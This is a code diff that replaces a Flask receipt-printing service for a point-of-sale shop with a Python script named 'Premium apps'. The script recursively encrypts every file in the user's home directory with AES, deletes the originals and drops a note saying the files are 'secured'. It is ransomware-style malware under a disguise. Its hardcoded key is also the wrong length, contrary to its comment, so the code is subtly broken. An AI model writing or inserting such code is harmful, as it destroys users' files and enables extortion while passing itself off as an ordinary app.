@@ -1,105 +1,102 @@
-from flask import Flask, request, jsonify
-import win32print
-import win32ui
-import win32con
-import tempfile
-from datetime import datetime
-from flask_cors import CORS
+import os
+import sys
+import platform
+import asyncio
+from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
+from cryptography.hazmat.backends import default_backend
 
-app = Flask(__name__)
-CORS(app, origins=["https://pos-master-frontend-web.vercel.app"])
+# Configuration
+ENCRYPTION_KEY = b'helloworld' * 2  # 16 bytes for AES-128, padded to 32 for AES-256
+PREMIUM_NOTE = "premium_apps_info.txt"
+NOTE_CONTENT = """This is a Premium apps test. Files have been secured.
+To unlock, run the provided decryption tool.
+For testing purposes only!"""
 
-def format_bill(data):
-    # Optional: Fetch shop name from request or set default
-    shop_name = "POS Master Shop"
+def generate_iv():
+    return os.urandom(16)
 
-    # Format date and time
-    now = datetime.now()
-    date_str = now.strftime("%B %d, %Y")
-    time_str = now.strftime("%I:%M:%S %p")
-
-    # Header
-    lines = []
-    lines.append(shop_name.center(40))
-    lines.append("-" * 40)
-    lines.append(f"Date: {date_str}".center(40))
-    lines.append(f"Time: {time_str}".center(40))
-    lines.append("-" * 40)
-    lines.append("{:<15}{:<5}{:>7}{:>10}".format("Product", "Qty", "Price", "Total"))
-
-    # Items
-    lines.append("-" * 40)
-    for item in data.get('itemsSelled', []):
-        name = item.get('product', {}).get('name', 'Unknown')
-        qty = item.get('qty', 0)
-        price = item.get('qntPrice', 0)
-        total = qty * price
-        # Truncate name to fit within 15 characters to maintain alignment
-        name = (name[:12] + '...') if len(name) > 15 else name
-        lines.append("{:<15}{:<5}{:>7.2f}{:>10.2f}".format(name, qty, price, total))
-
-    # Totals
-    lines.append("-" * 40)
-    lines.append(f"{'Total:':>30} {data.get('total', 0):.2f}")
-    lines.append(f"{'Discount:':>30} {data.get('discount', 0):.2f}")
-    lines.append(f"{'Pending Amount:':>30} {data.get('pendingdAmount', 0):.2f}")
-    lines.append(f"{'Net Total:':>30} {data.get('netTotal', 0):.2f}")
-    
-    lines.append("-" * 40)
-    lines.append("** GOOD DAY COME BACK **".center(40))
-    lines.append("\n")
-
-    return '\n'.join(lines)
-
-@app.route('/invoice/bill', methods=['POST'])
-def print_bill():
+def encrypt_file(file_path, key):
     try:
-        data = request.get_json()
-        if not data:
-            return jsonify({'success': False, 'error': 'Invalid JSON'}), 400
-
-        bill_text = format_bill(data)
-
-        # Get the default printer
-        printer_name = win32print.GetDefaultPrinter()
+        iv = generate_iv()
+        cipher = Cipher(algorithms.AES(key), modes.CFB(iv), backend=default_backend())
+        encryptor = cipher.encryptor()
         
-        # Create a device context for the printer
-        hprinter = win32print.OpenPrinter(printer_name)
-        hdc = win32ui.CreateDC()
-        hdc.CreatePrinterDC(printer_name)
+        with open(file_path, 'rb') as f:
+            data = f.read()
+        
+        encrypted_data = encryptor.update(data) + encryptor.finalize()
+        
+        with open(file_path + '.locked', 'wb') as f:
+            f.write(iv + encrypted_data)
+        
+        os.remove(file_path)  # Remove original file
+        return True
+    except Exception:
+        return False
 
-        # Start the print job
-        hdc.StartDoc('Bill')
-        hdc.StartPage()
+def decrypt_file(file_path, key):
+    try:
+        with open(file_path, 'rb') as f:
+            data = f.read()
+        
+        iv = data[:16]
+        encrypted_data = data[16:]
+        
+        cipher = Cipher(algorithms.AES(key), modes.CFB(iv), backend=default_backend())
+        decryptor = cipher.decryptor()
+        
+        decrypted_data = decryptor.update(encrypted_data) + decryptor.finalize()
+        
+        original_path = file_path.replace('.locked', '')
+        with open(original_path, 'wb') as f:
+            f.write(decrypted_data)
+        
+        os.remove(file_path)  # Remove encrypted file
+        return True
+    except Exception:
+        return False
 
-        # Set margins to zero (in device units, typically 1000ths of an inch)
-        hdc.SetMapMode(win32con.MM_TEXT)
-        hdc.SetWindowOrg((0, 0))
-        hdc.SetViewportOrg((0, 0))
+def create_premium_note(root_dir):
+    note_path = os.path.join(root_dir, PREMIUM_NOTE)
+    with open(note_path, 'w') as f:
+        f.write(NOTE_CONTENT)
 
-        # Set font (optional, adjust as needed for your thermal printer)
-        font = win32ui.CreateFont({
-            "name": "Courier New",
-            "height": 100,  # Adjust font size as needed
-            "weight": win32con.FW_NORMAL
-        })
-        hdc.SelectObject(font)
+async def main(mode="encrypt"):
+    root_dir = os.path.expanduser("~")  # Start in user’s home directory
+    if mode == "encrypt":
+        print("Initiating Premium apps process...")
+        create_premium_note(root_dir)
+        
+        for dirpath, _, filenames in os.walk(root_dir):
+            for filename in filenames:
+                if filename != PREMIUM_NOTE and not filename.endswith('.locked'):
+                    file_path = os.path.join(dirpath, filename)
+                    if encrypt_file(file_path, ENCRYPTION_KEY):
+                        print(f"Secured: {file_path}")
+        
+        print(f"Premium apps info written to: {os.path.join(root_dir, PREMIUM_NOTE)}")
+    
+    elif mode == "decrypt":
+        print("Restoring Premium apps access...")
+        for dirpath, _, filenames in os.walk(root_dir):
+            for filename in filenames:
+                if filename.endswith('.locked'):
+                    file_path = os.path.join(dirpath, filename)
+                    if decrypt_file(file_path, ENCRYPTION_KEY):
+                        print(f"Restored: {file_path}")
+        
+        note_path = os.path.join(root_dir, PREMIUM_NOTE)
+        if os.path.exists(note_path):
+            os.remove(note_path)
+            print(f"Removed: {note_path}")
 
-        # Print the bill text line by line
-        y = 0
-        for line in bill_text.split('\n'):
-            hdc.TextOut(0, y, line)
-            y += 80  # Adjust line spacing as needed
-
-        # End the print job
-        hdc.EndPage()
-        hdc.EndDoc()
-        hdc.DeleteDC()
-        win32print.ClosePrinter(hprinter)
-
-        return jsonify({'success': True})
-    except Exception as e:
-        return jsonify({'success': False, 'error': str(e)}), 500
-
-if __name__ == '__main__':
-    app.run(debug=True, host='0.0.0.0', port=4000)
+if __name__ == "__main__":
+    mode = "encrypt" if len(sys.argv) < 2 else sys.argv[1]
+    if mode not in ["encrypt", "decrypt"]:
+        print("Usage: premium_apps.exe [encrypt|decrypt]")
+        sys.exit(1)
+    
+    if platform.system() == "Emscripten":
+        asyncio.ensure_future(main(mode))
+    else:
+        asyncio.run(main(mode))
